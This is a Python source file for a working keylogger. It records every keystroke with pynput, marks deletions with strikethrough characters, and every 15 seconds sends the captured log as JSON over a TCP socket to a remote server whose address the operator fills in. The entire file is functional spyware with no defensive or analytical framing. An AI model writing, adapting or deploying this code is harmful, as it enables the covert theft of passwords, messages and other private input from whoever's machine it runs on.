from pynput import keyboard
from socket import *
import json
import sys
import threading
from threading import Timer

class Keylogger:
    def __init__(self):
        self.log = ""
        TIME_INTERVAL = 15
        self.interval = TIME_INTERVAL
        serverHost = "SET_AS_YOUR_IP"
        # serverHost = "127.0.0.1"
        serverPort = 2000
        serverAddress = (serverHost, serverPort)
        self.clientSocket = socket(AF_INET, SOCK_STREAM)
        self.clientSocket.connect(serverAddress)

    def callback_event(self, key):
        keyAdd = ""
        try:
            if hasattr(key, 'char') and key.char is not None:
                keyAdd = key.char
            elif key == keyboard.Key.space:
                keyAdd = " "
            elif key == keyboard.Key.enter:
                keyAdd = "\n"
            elif key == keyboard.Key.backspace:
                self.strikethrough()
                keyAdd = ""
            elif key == keyboard.Key.tab:
                keyAdd = "    "
            # elif key == keyboard.Key.esc:
            #     self.cleanup()
            else:
                keyAdd = f"[{key}]"

        except Exception as e:
            b = 1

        # adding in character to the log
        if isinstance(keyAdd, str):
            self.log += keyAdd

    # strikethrough runs everytime delete is called as an event
    def strikethrough(self):
        text = self.log
        index = -1;
        length = -1 * len(text)

        if '\u0336' != text[index]:
            text = text + "\u0336"
            self.log = text
            return

        while (index >= length):
            # means it is any other character and doesn't have a strikethrough through it
            if text[index] != '\u0336' and text[index + 1] != '\u0336':
                text = text[:(index + 1)] + '\u0336' + text[(index + 1):]
                break
            index -= 1
        self.log = text
        

    def send_socket(self):
        packet = json.dumps(self.log).encode('utf-8')
        self.clientSocket.sendall(packet)

    def report(self):
        self.send_socket()
        self.log = ""
        timer = Timer(interval = self.interval, function = self.report)
        timer.daemon = True
        timer.start()

    def cleanup(self):
        self.clientSocket.close()
        sys.exit(0)

    def start(self):
        listener = keyboard.Listener(on_press = self.callback_event)
        listener.start()
        self.report()
        listener.join()

def main():
    keylogger = Keylogger()
    try:
        keylogger.start()
    except KeyboardInterrupt:
        keylogger.cleanup()

if __name__ == "__main__":
    main()  